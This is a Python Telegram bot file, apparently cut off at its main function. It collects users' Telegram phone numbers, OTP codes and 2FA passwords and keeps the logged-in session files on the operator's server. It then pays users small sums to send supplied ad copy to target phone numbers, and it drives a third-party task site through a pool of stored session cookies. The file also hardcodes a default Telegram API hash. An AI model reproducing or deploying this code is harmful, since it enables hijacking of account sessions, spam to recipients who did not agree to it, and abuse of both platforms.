import os
import logging
import asyncio
import tempfile
import http.cookiejar
import requests
from datetime import datetime, timedelta
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from zoneinfo import ZoneInfo

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot,
    ReplyKeyboardMarkup, ReplyKeyboardRemove
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import ReturnDocument
from telethon import TelegramClient
from telethon.tl.functions.auth import ResendCodeRequest
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
)
from bson import ObjectId

logging.basicConfig(level=logging.INFO)
logging.getLogger("httpx").setLevel(logging.WARNING)   # token logs me na aaye
logging.getLogger("httpcore").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════
#  ENV CONFIG  (secrets sirf env se, code me kabhi nahi)
# ══════════════════════════════════════════════════════
BOT_TOKEN    = os.environ["BOT_TOKEN"]
ADMIN_ID     = int(os.environ["ADMIN_ID"])
MONGO_URI    = os.environ["MONGO_URI"]
API_ID       = int(os.getenv("API_ID", "39012032"))
API_HASH     = os.getenv("API_HASH", "c212edb95f5d3b49fe41e4818e918ea0")
CHANNEL_ID   = os.getenv("CHANNEL_ID", "")      # -100xxxx ya @username
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")    # optional: https://t.me/+xxxx
SITE_URL     = os.getenv("SITE_URL", "https://77uai.com")
COOKIE_FILE  = os.getenv("COOKIE_FILE", "cookies.txt")

TASK_REWARD  = 0.25
TASK_TIMEOUT = 540  # 9 min

IST = ZoneInfo("Asia/Kolkata")
TASK_START_HOUR = 8    # subah 8 baje
TASK_END_HOUR   = 22   # raat 10 baje

# ══════════════════════════════════════════════════════
#  MONGODB
# ══════════════════════════════════════════════════════
_db          = AsyncIOMotorClient(MONGO_URI)["tgbot"]
users_col    = _db["users"]
accounts_col = _db["tg_accounts"]
tasks_col    = _db["tasks"]
withdraw_col = _db["withdrawals"]
slots_col    = _db["cookie_slots"]

# ══════════════════════════════════════════════════════
#  CONVERSATION STATES
# ══════════════════════════════════════════════════════
ADD_PHONE, ADD_OTP, ADD_2FA, W_AMOUNT, W_UPI = range(5)

# ══════════════════════════════════════════════════════
#  HTTP SERVER (keep-alive ping)
# ══════════════════════════════════════════════════════
class _PingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a): pass

def start_http():
    port = int(os.getenv("PORT", 10000))
    Thread(target=HTTPServer(("0.0.0.0", port), _PingHandler).serve_forever, daemon=True).start()
    logger.info(f"[HTTP] port {port}")

def get_loop():
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed(): raise RuntimeError
        return loop
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop

# ══════════════════════════════════════════════════════
#  COOKIE POOL
#  Env: COOKIES_CONTENT, COOKIES_CONTENT_2 ... COOKIES_CONTENT_30
#  ya COOKIE_FILES="c1.txt,c2.txt,c3.txt"
# ══════════════════════════════════════════════════════
def _jar_from_text(text):
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
    tmp.write(text.replace("\\n", "\n")); tmp.close()
    jar = http.cookiejar.MozillaCookieJar(tmp.name)
    jar.load(ignore_discard=True, ignore_expires=True)
    os.unlink(tmp.name)
    return jar

def load_jars():
    jars = []
    names = ["COOKIES_CONTENT"] + [f"COOKIES_CONTENT_{i}" for i in range(2, 31)]
    for n in names:
        val = os.getenv(n, "")
        if val:
            try: jars.append(_jar_from_text(val))
            except Exception as e: logger.warning(f"{n}: {e}")
    for path in os.getenv("COOKIE_FILES", "").split(","):
        path = path.strip()
        if path:
            try:
                j = http.cookiejar.MozillaCookieJar(path)
                j.load(ignore_discard=True, ignore_expires=True)
                jars.append(j)
            except Exception as e: logger.warning(f"{path}: {e}")
    if not jars:
        try:
            j = http.cookiejar.MozillaCookieJar(COOKIE_FILE)
            j.load(ignore_discard=True, ignore_expires=True)
            jars.append(j)
        except Exception as e: logger.warning(f"cookie file: {e}")
    logger.info(f"[COOKIES] {len(jars)} loaded")
    return jars

JARS = load_jars()

def site(method, endpoint, body=None, idx=0):
    r = requests.request(
        method, SITE_URL + endpoint,
        cookies=JARS[idx],
        headers={
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "application/json, */*",
            "Content-Type": "application/json",
            "Referer": SITE_URL, "Origin": SITE_URL,
        }, json=body, timeout=15)
    try: return r.status_code, r.json()
    except ValueError: return r.status_code, {"raw": r.text}

# ── Cookie slot lock (atomic) ───────────────────────────
EPOCH = datetime(2000, 1, 1)

async def init_slots():
    for i in range(len(JARS)):
        await slots_col.update_one(
            {"idx": i},
            {"$setOnInsert": {"idx": i, "busy_until": EPOCH, "uid": None}},
            upsert=True)

async def take_slot(idx, uid):
    now = datetime.now()
    return await slots_col.find_one_and_update(
        {"idx": idx, "busy_until": {"$lte": now}},
        {"$set": {"busy_until": now + timedelta(seconds=TASK_TIMEOUT), "uid": uid}},
        return_document=ReturnDocument.AFTER)

async def free_slot(idx):
    await slots_col.update_one({"idx": idx}, {"$set": {"busy_until": EPOCH, "uid": None}})

async def slot_wait_mins(idx):
    s = await slots_col.find_one({"idx": idx})
    if not s: return 1
    return max(1, int((s["busy_until"] - datetime.now()).total_seconds() // 60) + 1)

# ── Time window ─────────────────────────────────────────
def task_window_open():
    return TASK_START_HOUR <= datetime.now(IST).hour < TASK_END_HOUR

def next_open_text():
    return "aaj subah 8 baje" if datetime.now(IST).hour < TASK_START_HOUR else "kal subah 8 baje"

# ══════════════════════════════════════════════════════
#  DB HELPERS
# ══════════════════════════════════════════════════════
async def get_user(uid):
    u = await users_col.find_one({"uid": uid})
    if not u:
        u = {"uid": uid, "balance": 0.0, "joined": datetime.now()}
        await users_col.insert_one(u)
    return u

async def add_bal(uid, amt):
    await users_col.update_one({"uid": uid}, {"$inc": {"balance": amt}}, upsert=True)

# ══════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════
def kb_main():
    return ReplyKeyboardMarkup([
        ["📋 TG Task"],
        ["➕ Add TG Account", "💸 Withdrawal"],
    ], resize_keyboard=True)

_link_cache = {"url": None}

async def channel_link(bot):
    """Join link: CHANNEL_LINK env > @username > bot se invite link"""
    if CHANNEL_LINK:
        return CHANNEL_LINK
    if _link_cache["url"]:
        return _link_cache["url"]
    url = None
    if CHANNEL_ID.startswith("@"):
        url = f"https://t.me/{CHANNEL_ID[1:]}"
    else:
        try:
            chat = await bot.get_chat(CHANNEL_ID)
            if chat.username:
                url = f"https://t.me/{chat.username}"
            else:
                url = chat.invite_link or await bot.export_chat_invite_link(CHANNEL_ID)
        except Exception as e:
            logger.warning(f"[CHANNEL LINK] {e}")
    _link_cache["url"] = url
    return url

async def kb_join(bot):
    url = await channel_link(bot)
    btns = []
    if url:
        btns.append(InlineKeyboardButton("📢 Channel Join Karo", url=url))
    btns.append(InlineKeyboardButton("✅ Check Kiya", callback_data="check_join"))
    return InlineKeyboardMarkup([btns])


# ══════════════════════════════════════════════════════
#  FORCE JOIN
# ══════════════════════════════════════════════════════
async def joined(uid, bot):
    if not CHANNEL_ID: return True
    try:
        m = await bot.get_chat_member(CHANNEL_ID, uid)
        return m.status not in ("left", "kicked")
    except Exception:
        return False

# ══════════════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.effective_user.first_name or "User"
    await get_user(uid)
    if not await joined(uid, ctx.bot):
        await update.message.reply_text(
            "🔒 *Pehle channel join karo!*",
            parse_mode="Markdown", reply_markup=await kb_join(ctx.bot))
        return
    u = await get_user(uid)
    await update.message.reply_text(
        f"👋 *Namaste {name}!*\n\n"
        f"💰 Balance: ₹{u['balance']:.2f}\n\n"
        f"Niche se option choose karo 👇",
        parse_mode="Markdown", reply_markup=kb_main())

async def cb_check_join(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if await joined(uid, ctx.bot):
        u = await get_user(uid)
        await q.edit_message_text(
            f"✅ *Join confirm!*\n\n💰 Balance: ₹{u['balance']:.2f}",
            parse_mode="Markdown")
        await ctx.bot.send_message(uid, "Ab bot use kar sakte ho 👇", reply_markup=kb_main())
    else:
        await q.answer("❌ Abhi join nahi kiya!", show_alert=True)

# ══════════════════════════════════════════════════════
#  TG TASK
# ══════════════════════════════════════════════════════
def acc_label(a):
    return f"📱 {a.get('name') or 'Account'} | {a['phone']}"

async def msg_tg_task(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await joined(uid, ctx.bot):
        await update.message.reply_text("🔒 Pehle channel join karo!", reply_markup=await kb_join(ctx.bot))
        return

    accs = await accounts_col.find({"uid": uid, "status": "accepted"}).to_list(50)
    if not accs:
        await update.message.reply_text(
            "⚠ *Koi accepted account nahi hai.*\n\n"
            "➕ Add TG Account se pehle account add karo, admin approve karega.",
            parse_mode="Markdown")
        return

    # Chalta hua task dobara dikhao (time window ke bahar bhi)
    existing = await tasks_col.find_one({"uid": uid, "status": "pending"})
    if existing:
        left = int((existing["expires_at"] - datetime.now()).total_seconds())
        if left > 0:
            await _send_task(update.message, existing, left)
            return
        await tasks_col.update_one({"_id": existing["_id"]}, {"$set": {"status": "expired"}})
        await free_slot(existing.get("cookie_idx", 0))

    if not task_window_open():
        await update.message.reply_text(
            f"⏰ *Abhi task available nahi hai.*\n\n"
            f"Task roz *subah 8 baje se raat 10 baje* tak milte hain.\n"
            f"Agla task {next_open_text()} milega.",
            parse_mode="Markdown")
        return

    if len(accs) == 1:
        await start_task(uid, accs[0], update.message)
        return

    kb = [[InlineKeyboardButton(acc_label(a), callback_data=f"pick_acc_{a['_id']}")] for a in accs]
    await update.message.reply_text(
        "📲 *Kis account se task lena hai?*",
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def cb_pick_acc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    acc = await accounts_col.find_one(
        {"_id": ObjectId(q.data.replace("pick_acc_", "")), "uid": uid, "status": "accepted"})
    if not acc:
        await q.edit_message_text("❌ Account nahi mila."); return
    if await tasks_col.find_one({"uid": uid, "status": "pending", "expires_at": {"$gt": datetime.now()}}):
        await q.edit_message_text("⚠ Aapka ek task already chal raha hai. Pehle usse complete karo.")
        return
    if not task_window_open():
        await q.edit_message_text("⏰ Task ka time (8 AM - 10 PM) nahi hai."); return
    await q.edit_message_text(f"✅ Selected: {acc_label(acc)}")
    await start_task(uid, acc, q.message)

async def start_task(uid, acc, msg):
    idx = acc.get("cookie_idx", 0)
    if idx >= len(JARS):
        await msg.reply_text("❌ Is account ki cookie configured nahi hai. Admin se contact karo.")
        return

    slot = await take_slot(idx, uid)
    if not slot:
        mins = await slot_wait_mins(idx)
        await msg.reply_text(
            f"⏳ Is account ka slot abhi busy hai (koi aur task le raha hai).\n"
            f"Lagbhag *{mins} minute* baad try karo.", parse_mode="Markdown")
        return

    wait_msg = await msg.reply_text("⏳ Task le rahe hain...")
    account_id = acc.get("site_account_id")
    loop = asyncio.get_event_loop()
    try:
        _, data = await loop.run_in_executor(
            None, site, "POST", "/api/tasks/claim",
            {"channel": "telegram", "account_id": account_id}, idx)
        if not data.get("ok"):
            _, data = await loop.run_in_executor(
                None, site, "GET", "/api/tasks/current?channel=telegram", None, idx)
        task_data = data.get("data")
        await wait_msg.delete()
        if not task_data:
            await free_slot(idx)
            await msg.reply_text("❌ Abhi koi task nahi hai. Thodi der baad try karo.")
            return
        _, me_data = await loop.run_in_executor(None, site, "GET", "/api/me", None, idx)
        bal_at_claim = me_data.get("data", {}).get("points_balance", 0)
        logger.info(f"[TASK] uid={uid} cookie={idx} bal_at_claim={bal_at_claim}")
    except Exception as e:
        logger.error(f"[TASK] {e}")
        await free_slot(idx)
        await msg.reply_text("❌ Error aaya, dobara try karo.")
        return

    doc = {
        "uid": uid, "account_id": account_id, "cookie_idx": idx,
        "acc_phone": acc.get("phone"),
        "target_phone": task_data.get("target_phone", ""),
        "ad_copy": task_data.get("ad_copy", ""),
        "status": "pending", "bal_at_claim": bal_at_claim,
        "created_at": datetime.now(),
        "expires_at": datetime.now() + timedelta(seconds=TASK_TIMEOUT),
    }
    res = await tasks_col.insert_one(doc)
    doc["_id"] = res.inserted_id
    await _send_task(msg, doc, TASK_TIMEOUT)

async def _send_task(msg, task, time_left):
    mins, secs = time_left // 60, time_left % 60
    text = (
        f"📋 *TASK*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📤 *Account:* `{task.get('acc_phone', '')}`\n"
        f"📱 *Number:* `+{task['target_phone']}`\n"
        f"⏳ *Time:* {mins}m {secs}s\n"
        f"💰 *Reward:* ₹{TASK_REWARD:.2f}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📝 *Yeh message bhejo:*\n\n"
        f"`{task['ad_copy']}`\n\n"
        f"👆 Copy karo, number pe bhejo, phir Done dabao."
    )
    await msg.reply_text(
        text, parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Done — Check Karo", callback_data=f"task_done_{task['_id']}")]
        ]))

async def cb_task_done(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("⏳ Check ho raha hai...")
    uid = q.from_user.id
    tid = q.data.replace("task_done_", "")

    task = await tasks_col.find_one({"_id": ObjectId(tid), "uid": uid})
    if not task:
        await q.edit_message_text("❌ Task nahi mila."); return
    if task["status"] != "pending":
        await q.edit_message_text(f"ℹ Task {task['status']} hai."); return

    idx = task.get("cookie_idx", 0)

    if datetime.now() > task["expires_at"]:
        await tasks_col.update_one({"_id": task["_id"]}, {"$set": {"status": "expired"}})
        await free_slot(idx)
        await q.edit_message_text("⏰ *Task expire ho gaya!*\n\nNaya task lo.", parse_mode="Markdown")
        return

    await q.edit_message_text("⏳ Verify ho raha hai... (10 sec)")
    loop = asyncio.get_event_loop()

    await loop.run_in_executor(None, site, "POST", "/api/tasks/check", {"channel": "telegram"}, idx)
    await asyncio.sleep(10)

    _, me_now = await loop.run_in_executor(None, site, "GET", "/api/me", None, idx)
    bal_now = me_now.get("data", {}).get("points_balance", 0)
    bal_at_claim = task.get("bal_at_claim", 0)
    logger.info(f"[CHECK] uid={uid} cookie={idx} bal_at_claim={bal_at_claim} bal_now={bal_now}")

    if bal_now > bal_at_claim:
        # atomic: sirf ek baar reward mile
        done = await tasks_col.find_one_and_update(
            {"_id": task["_id"], "status": "pending"},
            {"$set": {"status": "completed", "completed_at": datetime.now()}})
        await free_slot(idx)
        if not done:
            await q.edit_message_text("ℹ Task already process ho chuka hai."); return
        await add_bal(uid, TASK_REWARD)
        u = await get_user(uid)
        await q.edit_message_text(
            f"✅ *TASK COMPLETE!*\n\n"
            f"💰 +₹{TASK_REWARD:.2f} mili!\n"
            f"📊 Total Balance: ₹{u['balance']:.2f}",
            parse_mode="Markdown")
    else:
        # Fail: slot free nahi karte, user retry kar sakta hai
        await q.edit_message_text(
            "❌ *Verify nahi hua*\n\n"
            "• Message bheja?\n"
            "• Sahi number pe bheja?\n"
            "• Sahi account se bheja?\n\n"
            "Message bhejo phir check karo.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Dobara Check Karo", callback_data=f"task_done_{tid}")]
            ]))

# ══════════════════════════════════════════════════════
#  ADD ACCOUNT (Telethon OTP flow) — user kai accounts add kar sakta hai
# ══════════════════════════════════════════════════════
async def msg_add_account(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📱 *Account Add Karo*\n\n"
        "Apna Indian number bhejo:\n"
        "Format: `+91XXXXXXXXXX`\n\n"
        "/cancel to cancel",
        parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
    return ADD_PHONE

def code_type_text(sent):
    t = type(sent.type).__name__
    return {
        "SentCodeTypeApp": "📲 Telegram app ke andar, 'Telegram' naam ki official chat mein (SMS nahi aayega)",
        "SentCodeTypeSms": "💬 SMS se",
        "SentCodeTypeCall": "📞 Phone call se",
        "SentCodeTypeFlashCall": "📞 Flash call se",
        "SentCodeTypeMissedCall": "📞 Missed call se",
    }.get(t, t)

async def got_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    uid = update.effective_user.id

    dup = await accounts_col.find_one({"phone": phone, "status": {"$in": ["pending", "accepted"]}})
    if dup:
        await update.message.reply_text(
            "⚠ Ye number pehle se add hai ya pending hai.", reply_markup=kb_main())
        return ConversationHandler.END

    ctx.user_data["phone"] = phone
    await update.message.reply_text(f"⏳ `{phone}` pe OTP bhej rahe hain...", parse_mode="Markdown")
    try:
        safe = phone.replace("+", "")
        tg = TelegramClient(f"sessions/{uid}_{safe}", API_ID, API_HASH)
        await tg.connect()
        res = await tg.send_code_request(phone)
        ctx.user_data["phone_code_hash"] = res.phone_code_hash
        ctx.user_data["tg_client"] = tg
        await update.message.reply_text(
            f"✅ OTP bheja gaya: {code_type_text(res)}\n\n"
            f"Woh code yahan type karo.\n"
            f"Nahi aaya to `resend` likho.\n\n/cancel to cancel",
            parse_mode="Markdown")
        return ADD_OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}", reply_markup=kb_main())
        return ConversationHandler.END

async def got_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    tg: TelegramClient = ctx.user_data.get("tg_client")
    if update.message.text.strip().lower() == "resend":
        try:
            res = await tg(ResendCodeRequest(ctx.user_data["phone"], ctx.user_data["phone_code_hash"]))
            ctx.user_data["phone_code_hash"] = res.phone_code_hash
            await update.message.reply_text(
                f"🔁 Dobara bheja: {code_type_text(res)}\n\nCode yahan type karo.")
        except Exception as e:
            await update.message.reply_text(f"❌ Resend nahi hua: {e}")
        return ADD_OTP
    try:
        await tg.sign_in(phone=ctx.user_data["phone"], code=update.message.text.strip(),
                         phone_code_hash=ctx.user_data["phone_code_hash"])
        me = await tg.get_me()
        await _save_request(uid, ctx.user_data["phone"], me, tg)
        await update.message.reply_text(
            "✅ *Request bhej di!*\n\nAdmin approve karega, notification aayega.",
            parse_mode="Markdown", reply_markup=kb_main())
        return ConversationHandler.END
    except SessionPasswordNeededError:
        await update.message.reply_text("🔐 2FA password enter karo:\n\n/cancel to cancel")
        return ADD_2FA
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await tg.disconnect()
        await update.message.reply_text("❌ OTP galat ya expire! Dobara Add TG Account dabao.", reply_markup=kb_main())
        return ConversationHandler.END
    except Exception as e:
        await tg.disconnect()
        await update.message.reply_text(f"❌ Error: {e}", reply_markup=kb_main())
        return ConversationHandler.END

async def got_2fa(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    tg: TelegramClient = ctx.user_data.get("tg_client")
    try:
        await tg.sign_in(password=update.message.text.strip())
        me = await tg.get_me()
        await _save_request(uid, ctx.user_data["phone"], me, tg)
        await update.message.reply_text(
            "✅ *Request bhej di!*\n\nAdmin approve karega.",
            parse_mode="Markdown", reply_markup=kb_main())
        return ConversationHandler.END
    except Exception as e:
        await tg.disconnect()
        await update.message.reply_text(f"❌ 2FA Error: {e}", reply_markup=kb_main())
        return ConversationHandler.END

async def _save_request(uid, phone, me, tg):
    name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    await accounts_col.insert_one({
        "uid": uid, "phone": phone, "tg_id": me.id,
        "name": name, "username": me.username,
        "status": "pending", "site_account_id": None, "cookie_idx": 0,
        "requested_at": datetime.now(),
    })
    await Bot(BOT_TOKEN).send_message(
        ADMIN_ID,
        f"🔔 *New Account Request*\n\n"
        f"👤 Name: {name}\n"
        f"📱 Phone: `{phone}`\n"
        f"🆔 TG ID: `{me.id}`\n"
        f"👤 User ID: `{uid}`\n\n"
        f"Accept karte waqt site account ID bhejo.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Accept", callback_data=f"acc_accept_{uid}_{me.id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"acc_reject_{uid}_{me.id}"),
        ]]))
    await tg.disconnect()

# ── Admin Accept / Reject ───────────────────────────────
async def cb_acc_accept(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Sirf admin!", show_alert=True); return
    parts = q.data.split("_")
    uid, tg_id = int(parts[2]), int(parts[3])
    await q.answer()
    await q.edit_message_text(
        q.message.text + "\n\n⏳ Site Account ID type karo (sirf number):")
    ctx.user_data["p_uid"]   = uid
    ctx.user_data["p_tg_id"] = tg_id
    ctx.user_data["wait_id"] = True

async def cb_acc_reject(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Sirf admin!", show_alert=True); return
    parts = q.data.split("_")
    uid, tg_id = int(parts[2]), int(parts[3])
    await q.answer()
    await accounts_col.update_one({"uid": uid, "tg_id": tg_id}, {"$set": {"status": "rejected"}})
    await q.edit_message_text(q.message.text + "\n\n❌ REJECTED")
    await Bot(BOT_TOKEN).send_message(
        uid, "❌ Aapka account reject ho gaya.\nDobara try karo ya admin se contact karo.",
        reply_markup=kb_main())

async def admin_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    txt = update.message.text.strip()

    # ✏️ Existing account ka Site ID change
    edit_id = ctx.user_data.get("edit_sid_acc")
    if edit_id:
        if not txt.isdigit():
            await update.message.reply_text("❌ Sirf number bhejo."); return
        await accounts_col.update_one(
            {"_id": ObjectId(edit_id)}, {"$set": {"site_account_id": int(txt)}})
        ctx.user_data.pop("edit_sid_acc", None)
        await update.message.reply_text(
            f"✅ Site ID update ho gaya: {txt}\n\n/accounts se aur edit kar sakte ho.")
        return

    if not ctx.user_data.get("wait_id"): return
    if not txt.isdigit():
        await update.message.reply_text("❌ Sirf number bhejo."); return
    ctx.user_data["p_site_id"] = int(txt)
    ctx.user_data["wait_id"] = False

    rows, row = [], []
    for i in range(len(JARS)):
        row.append(InlineKeyboardButton(f"🍪 Cookie {i+1}", callback_data=f"acc_ck_{i}"))
        if len(row) == 3:
            rows.append(row); row = []
    if row: rows.append(row)
    await update.message.reply_text(
        "🍪 Ye account site pe kis cookie wale login me hai?",
        reply_markup=InlineKeyboardMarkup(rows))

async def cb_acc_cookie(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Sirf admin!", show_alert=True); return
    await q.answer()
    idx = int(q.data.replace("acc_ck_", ""))
    uid     = ctx.user_data.get("p_uid")
    tg_id   = ctx.user_data.get("p_tg_id")
    site_id = ctx.user_data.get("p_site_id")
    if not (uid and tg_id and site_id):
        await q.edit_message_text("❌ Session expire. Dobara Accept dabao."); return

    await accounts_col.update_one(
        {"uid": uid, "tg_id": tg_id},
        {"$set": {"status": "accepted", "site_account_id": site_id,
                  "cookie_idx": idx, "accepted_at": datetime.now()}})
    ctx.user_data.pop("p_site_id", None)
    await q.edit_message_text(f"✅ Accepted!\nSite ID: {site_id}\n🍪 Cookie: {idx+1}")
    await Bot(BOT_TOKEN).send_message(
        uid, "🎉 *Aapka TG Account Accept Ho Gaya!*\n\nAb TG Task kar sakte ho.",
        parse_mode="Markdown", reply_markup=kb_main())

# ── Admin: accepted accounts ka Site ID / Cookie badlo ──
async def cmd_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    accs = await accounts_col.find({"status": "accepted"}).sort("accepted_at", -1).to_list(60)
    if not accs:
        await update.message.reply_text("Koi accepted account nahi hai."); return
    kb = [[InlineKeyboardButton(
        f"{a['phone']} | ID {a.get('site_account_id')} | 🍪{a.get('cookie_idx', 0)+1}",
        callback_data=f"adm_ed_{a['_id']}")] for a in accs]
    await update.message.reply_text(
        "📋 *Accepted Accounts*\nEdit karne ke liye account chuno:",
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def cb_adm_edit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Sirf admin!", show_alert=True); return
    await q.answer()
    aid = q.data.replace("adm_ed_", "")
    a = await accounts_col.find_one({"_id": ObjectId(aid)})
    if not a:
        await q.edit_message_text("❌ Account nahi mila."); return
    await q.edit_message_text(
        f"📱 {a['phone']} ({a.get('name') or '-'})\n"
        f"👤 User: {a['uid']}\n"
        f"🔢 Site ID: {a.get('site_account_id')}\n"
        f"🍪 Cookie: {a.get('cookie_idx', 0)+1}\n\nKya badalna hai?",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔢 Site ID badlo", callback_data=f"adm_sid_{aid}")],
            [InlineKeyboardButton("🍪 Cookie badlo", callback_data=f"adm_ckp_{aid}")],
        ]))

async def cb_adm_sid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Sirf admin!", show_alert=True); return
    await q.answer()
    ctx.user_data["edit_sid_acc"] = q.data.replace("adm_sid_", "")
    await q.edit_message_text("🔢 Naya Site Account ID type karo (sirf number):")

async def cb_adm_ckpick(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Sirf admin!", show_alert=True); return
    await q.answer()
    aid = q.data.replace("adm_ckp_", "")
    rows, row = [], []
    for i in range(len(JARS)):
        row.append(InlineKeyboardButton(f"🍪 Cookie {i+1}", callback_data=f"adm_cks_{aid}_{i}"))
        if len(row) == 3:
            rows.append(row); row = []
    if row: rows.append(row)
    await q.edit_message_text("🍪 Naya cookie chuno:", reply_markup=InlineKeyboardMarkup(rows))

async def cb_adm_ckset(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("❌ Sirf admin!", show_alert=True); return
    await q.answer()
    _, _, aid, idx = q.data.split("_")
    await accounts_col.update_one({"_id": ObjectId(aid)}, {"$set": {"cookie_idx": int(idx)}})
    await q.edit_message_text(f"✅ Cookie {int(idx)+1} set ho gaya.\n\n/accounts se aur edit kar sakte ho.")

# ══════════════════════════════════════════════════════
#  WITHDRAWAL
# ══════════════════════════════════════════════════════
async def msg_withdrawal(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = await get_user(uid)
    await update.message.reply_text(
        f"💸 *Withdrawal*\n\n"
        f"💰 Available: ₹{u['balance']:.2f}\n\n"
        f"Kitna withdraw karna hai?\n_(Minimum ₹10)_\n\n/cancel to cancel",
        parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
    return W_AMOUNT

async def got_w_amount(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = await get_user(uid)
    try:
        amt = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ Valid amount likho."); return W_AMOUNT
    if amt < 10:
        await update.message.reply_text("❌ Minimum ₹10!"); return W_AMOUNT
    if amt > u["balance"]:
        await update.message.reply_text(f"❌ Balance kam hai! Available: ₹{u['balance']:.2f}"); return W_AMOUNT
    ctx.user_data["w_amt"] = amt
    await update.message.reply_text(
        "📲 Apna UPI ID bhejo:\n_(e.g. name@upi)_\n\n/cancel to cancel",
        parse_mode="Markdown")
    return W_UPI

async def got_w_upi(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    amt = ctx.user_data.get("w_amt", 0)
    upi = update.message.text.strip()

    # atomic deduct: balance kam ho to fail
    res = await users_col.update_one(
        {"uid": uid, "balance": {"$gte": amt}}, {"$inc": {"balance": -amt}})
    if res.modified_count == 0:
        await update.message.reply_text("❌ Balance kam hai!", reply_markup=kb_main())
        return ConversationHandler.END

    await withdraw_col.insert_one({
        "uid": uid, "amount": amt, "upi": upi,
        "status": "pending", "requested_at": datetime.now()
    })
    await update.message.reply_text(
        f"✅ *Withdrawal Request Bheja!*\n\n"
        f"💰 Amount: ₹{amt:.2f}\n"
        f"📲 UPI: {upi}\n\n"
        f"24-48 hours mein process hogi.",
        parse_mode="Markdown", reply_markup=kb_main())
    await Bot(BOT_TOKEN).send_message(
        ADMIN_ID,
        f"💸 *Withdrawal Request*\n\n"
        f"👤 User: `{uid}`\n💰 ₹{amt:.2f}\n📲 `{upi}`",
        parse_mode="Markdown")
    return ConversationHandler.END

async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    tg = ctx.user_data.pop("tg_client", None)
    if tg:
        try: await tg.disconnect()
        except Exception: pass
    await update.message.reply_text("❌ Cancel.", reply_markup=kb_main())
    return ConversationHandler.END

async def cb_back_main(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    u = await get_user(q.from_user.id)
    await q.edit_message_text(f"💰 Balance: ₹{u['balance']:.2f}\n\nNiche se option choose karo 👇")

# ══════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════
async def run_bot():
    os.makedirs("sessions", exist_ok=True)
    await init_slots()
    app = Application.builder().token(BOT_TOKEN).build()

